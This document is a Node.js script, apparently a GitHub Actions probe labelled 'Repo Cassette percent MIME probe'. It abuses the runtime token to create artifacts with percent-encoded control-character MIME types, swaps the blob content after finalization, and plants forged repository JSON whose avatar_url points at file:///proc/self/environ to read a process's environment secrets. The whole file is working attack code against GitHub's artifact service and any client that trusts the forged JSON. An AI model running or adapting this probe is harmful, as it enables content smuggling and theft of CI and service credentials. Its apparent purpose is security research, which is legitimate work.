const {createHash} = require('node:crypto');

module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
  const base = `${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const cases = [
    ['prefix-pct85', '%85application/json'],
    ['suffix-pct85', 'application/json%85'],
    ['prefix-pctc285', '%C2%85application/json'],
    ['suffix-pctc285', 'application/json%C2%85'],
    ['prefix-pct1c', '%1Capplication/json'],
    ['suffix-pct1c', 'application/json%1C'],
  ];

  async function twirp(method, payload) {
    const response = await fetch(base + method, {
      method: 'POST',
      headers: {Authorization: `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
    });
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }

  for (const [label, mime] of cases) {
    const name = `percent-mime-${context.runId}-${label}`;
    try {
      const created = await twirp('CreateArtifact', {...ids, name, version: 7, mime_type: mime});
      const upload = created.data.signed_upload_url || created.data.signedUploadUrl;
      if (!created.data.ok || !upload) {
        console.log('CASE', JSON.stringify({label, mime, create: created.status, ok: created.data.ok, msg: created.data.msg || ''}));
        continue;
      }
      const placeholder = Buffer.from('{"placeholder":true}');
      let put = await fetch(upload, {
        method: 'PUT',
        headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json', 'Content-Length': String(placeholder.length)},
        body: placeholder,
      });
      if (put.status !== 201) throw new Error(`initial upload ${put.status}`);
      const hash = createHash('sha256').update(placeholder).digest('hex');
      const finalized = await twirp('FinalizeArtifact', {...ids, name, size: String(placeholder.length), hash: `sha256:${hash}`});
      const id = String(finalized.data.artifact_id || finalized.data.artifactId || '');
      if (!finalized.data.ok || !/^\d+$/.test(id)) throw new Error(`finalize ${finalized.status}`);
      const repository = `${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`;
      const body = Buffer.from(JSON.stringify({full_name: repository, owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'}, description: 'Repo Cassette percent MIME probe', stargazers_count: 0}));
      put = await fetch(upload, {
        method: 'PUT',
        headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json', 'Content-Length': String(body.length)},
        body,
      });
      if (put.status !== 201) throw new Error(`final upload ${put.status}`);
      const rest = await fetch(`https://api.github.com/repos/${repository}`, {
        redirect: 'manual',
        headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json'},
      });
      const location = rest.headers.get('location');
      if (!location) throw new Error(`REST ${rest.status} has no Location`);
      const rsct = new URL(location).searchParams.get('rsct');
      const raw = await fetch(location);
      const got = Buffer.from(await raw.arrayBuffer());
      const ct = raw.headers.get('content-type');
      console.log('CASE', JSON.stringify({label, mime, id, rest: rest.status, rsct, raw: raw.status, ct, ctHex: ct ? Buffer.from(ct, 'latin1').toString('hex') : null, bodyMatches: got.equals(body), sourceSha: createHash('sha256').update(got).digest('hex')}));
    } catch (error) {
      console.log('CASE', JSON.stringify({label, mime, error: String(error)}));
    }
  }
};
